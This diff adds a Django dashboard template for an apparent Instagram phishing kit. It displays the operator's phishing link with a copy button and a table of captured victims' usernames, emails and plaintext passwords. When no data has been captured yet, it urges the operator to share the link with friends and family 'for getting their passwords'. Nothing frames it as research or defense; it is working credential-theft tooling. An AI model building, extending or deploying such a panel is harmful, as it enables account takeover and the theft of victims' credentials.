@@ -1,0 +1,128 @@
+{% extends "base.html" %}
+
+{% load i18n %}
+
+{% block head_title %}{% trans "Dashboard" %}{% endblock %}
+
+{% block extra_head %}
+
+  
+
+
+  <script>
+
+    function copy_instagram(){
+      var Text = document.getElementById('instagram_url').innerText;
+      var elem = document.createElement("textarea");
+      document.body.appendChild(elem);
+      elem.value = Text;
+      elem.select();
+      document.execCommand("copy");
+      document.body.removeChild(elem);
+
+      var tooltip = document.getElementById("myTooltip");
+      tooltip.innerHTML = "Copied: " + Text;
+    }
+
+    function outFunc() {
+      var tooltip = document.getElementById("myTooltip");
+      tooltip.innerHTML = "Copy to clipboard";
+    }
+
+  </script>
+
+
+
+{% endblock %}
+
+{% block content %}
+<h1>{% trans "Dashboard" %}</h1>
+
+
+
+ 
+<div class="card shadow mb-4">
+    <div class="card-header py-3">
+      <h6 class="m-0 font-weight-bold text-primary">Your  Phising Links</h6>
+    </div>
+    <div class="card-body ">
+        
+        <div class="row">
+          <div class="col">
+            <a href="#" class="btn btn-dangerbtn-sm btn-circle">
+              <abbr title="Instagram">
+                  <i style="font-size: 30px; color: red;" class="fa fa-instagram"></i>
+              </abbr>
+            </a>
+          </div>
+          <div class="col-8">
+            <b> <p id="instagram_url">{{instagram_url}}</p> </b>
+          </div>
+          <div class="col">
+            
+               <button class="btn btn-primary btn-sm" style="float: right;" data-toggle="tooltip" data-placement="top" title="Click to Copy url"  onclick="copy_instagram()" onmouseout="outFunc()" >
+                Copy
+              </button>
+              
+          </div>
+        </div>
+        
+    </div>
+</div>
+
+
+
+
+{% if data %}
+<div class="card shadow mb-4">
+    <div class="card-header py-3">
+      <h6 class="m-0 font-weight-bold text-primary">Your Phising Data</h6>
+    </div>
+    <div class="card-body">
+      <div class="table-responsive">
+<table class="table table-bordered" id="dataTable" width="100%" cellspacing="0">
+    <thead>
+      <tr>
+        <th>Username Or Email</th>
+        <th>Password</th>
+        <th>Website</th>
+        <th>Created</th>
+        
+      </tr>
+    </thead>
+    <tbody>
+        {% for i in data %}
+            <tr>
+                <td>{{i.username_or_email}}</td>
+                <td>{{i.password}}</td>
+                <td>{{i.website}}</td>
+                <td>{{i.created}}</td>
+            </tr>
+        {% endfor %}
+    </tbody>
+</table>
+</div>
+</div>
+</div>
+{% else %}
+<div class="card shadow mb-4">
+    <div class="card-header py-3">
+      <h6 class="m-0 font-weight-bold text-primary">Your Phising Data</h6>
+    </div>
+    <div class="card-body">
+        <div class="table-responsive ">
+            <p style="text-align: center;">Currently No One Used Your Link For Login</p>
+            <p style="text-align: center;">Share Those upper links to your friends and family members for getting their passwords </p>
+        </div>
+    </div>
+</div>
+{% endif %}
+
+
+
+
+{% endblock %}
+
+
+
+    
